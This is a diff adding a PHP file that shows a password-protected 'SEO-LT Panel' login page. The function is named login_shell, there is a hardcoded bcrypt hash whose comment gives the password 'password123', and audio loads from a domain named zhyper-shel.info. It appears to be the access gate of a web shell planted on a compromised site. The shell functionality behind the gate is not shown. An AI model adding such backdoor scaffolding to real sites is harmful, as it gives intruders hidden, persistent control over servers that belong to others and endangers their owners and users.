@@ -1,0 +1,243 @@
+<?php
+session_start();
+
+// Password Bcrypt (hash dari "password123")
+$hashed_password = '$2y$10$fZ/ez7MrWDlly5MOHOaaZOdgNwmcWJTklpMB/oOL0V9HnNS5Crvmy';
+
+function login_shell()
+{
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SEO-LT</title>
+    <link rel="icon" type="image/png" href="https://desa-angin.pro/images/seo-lt.png">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Arial', sans-serif;
+        }
+
+        /* Video Background */
+        .video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+
+        .login-container {
+            position: relative;
+            z-index: 1;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            border-radius: 15px;
+            color: #fff;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            max-width: 350px;
+            margin: 0 auto;
+            top: 50%;
+            transform: translateY(-50%);
+            backdrop-filter: blur(10px);
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 15px;
+            backdrop-filter: blur(5px);
+            transition: all 0.3s ease;
+        }
+
+        .login-container input[type="password"]::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .login-container input[type="password"]:focus {
+            border-color: #4e4e4e;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.3s ease;
+        }
+
+        .login-container input[type="submit"]:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Marquee Fixed */
+        .marquee-container {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            height: 40px;
+            overflow: hidden;
+            z-index: 2;
+        }
+
+        .marquee {
+            white-space: nowrap;
+            display: inline-block;
+            padding-left: 100%;
+            animation: marquee 15s linear infinite;
+            font-size: 14px;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        @keyframes marquee {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* Audio Controls */
+        .audio-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            z-index: 3;
+            backdrop-filter: blur(10px);
+        }
+
+        .audio-container button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 0 5px;
+            transition: color 0.3s;
+        }
+
+        .audio-container button:hover {
+            color: #ffcc00;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 20px;
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Video Background MP4 (ganti src dengan video MP4 Anda, misal dari Mixkit atau Vecteezy) -->
+    <video class="video-bg" autoplay muted loop playsinline>
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-abstract-animated-lines-background-11071-large.mp4" type="video/mp4">
+        <!-- Fallback video gratis lain: https://mixkit.co/free-stock-video/abstract/ -->
+        Browser tidak mendukung video.
+    </video>
+
+    <!-- Overlay gelap -->
+    <div class="overlay"></div>
+
+    <!-- Marquee -->
+    <div class="marquee-container">
+        <div class="marquee">copyright © SEO-LT - Protected by Advanced Security</div>
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <div class="icon">🔐</div>
+        <h2>SEO-LT Panel</h2>
+        <form action="" method="post">
+            <input type="password" name="pass" placeholder="Enter Password" required>
+            <br>
+            <input type="submit" name="submit" value="🚀 Login">
+        </form>
+    </div>
+
+    <!-- Musik (opsional, tetap seperti semula) -->
+    <audio id="bg-music" loop>
+        <source src="https://zhyper-shel.info/audio/music.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Kontrol Musik -->
+    <div class="audio-container">
+        <button onclick="toggleMusic()" title="Play/Pause">⏯️</button>
+        <button onclick="muteMusic()" title="Mute">🔇</button>
+    </div>
+
+    <script>
+        var music = document.getElementById("bg-music");
+        music.volume = 0.3;
+        
+        function toggleMusic() {
+            if (music.paused) music.play(); else music.pause();
+        }
+        function muteMusic() {
+            music.muted = !music.muted;
+        }
+        // Autoplay music setelah interaksi
+        document.addEventListener("click", () => music.play(), { once: true });
+    </script>
+</body>
+</html>
+<?php
+    exit;
+}
+
+// Cek login (sama seperti asli)
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
+        $_SESSION['auth'] = true;
+        header("refresh: 0;");
+    } else {
+        login_shell();
+    }
+}
+?>
